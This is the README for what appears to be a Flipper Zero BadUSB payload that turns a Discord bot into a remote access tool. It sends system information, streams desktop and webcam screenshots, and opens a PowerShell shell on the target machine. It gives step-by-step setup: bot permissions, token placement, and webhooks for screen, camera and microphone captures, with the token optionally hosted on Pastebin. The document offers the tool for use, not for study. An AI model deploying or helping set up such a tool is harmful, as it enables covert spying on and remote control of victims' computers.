**SYNOPSIS**

Uses a Discord bot to send system information, stream desktop and webcam screenshots
Also opens a powershell command line interface through discord.

![scampwn](https://github.com/beigeworm/BadUSB-Files-For-FlipperZero/assets/93350544/ffcc08a2-42d6-4ccd-8b3c-9534bea74174)

**SETUP**

-SETUP THE BOT
1. make a discord bot at https://discord.com/developers/applications/
2. Enable all Privileged Gateway Intents on 'Bot' page
3. On OAuth2 page, tick 'Bot' in Scopes section
4. In Bot Permissions section tick Manage Channels, Read Messages/View Channels, Attach Files, Read Message History.
5. Copy the URL into a browser and add the bot to your server.
6. On 'Bot' page click 'Reset Token' and copy the token.

-SETUP THE SCRIPT

----- Option 1 ----- (token placed in ps1 file)
1. Copy the token into the Bad USB txt file directly

----- Option 2 ----- (token hosted online) 
1. Create a file on Pastebin or Github with the content below - Supply your token and optional webhooks (include braces)
{
  "tk": "TOKEN_HERE",
  "scrwh": "WEBHOOK_HERE",
  "camwh": "WEBHOOK_HERE",
  "micwh": "WEBHOOK_HERE"
}
2. Copy the RAW file url into the Bad USB txt file like this.. $uri = 'https://pastebin.com/raw/xxxxxxxx'


**INFORMATION**

- The Discord bot you use must be in one server only
- You can specify webhooks to send duplicate files to other channels on another server (OPTIONAL)

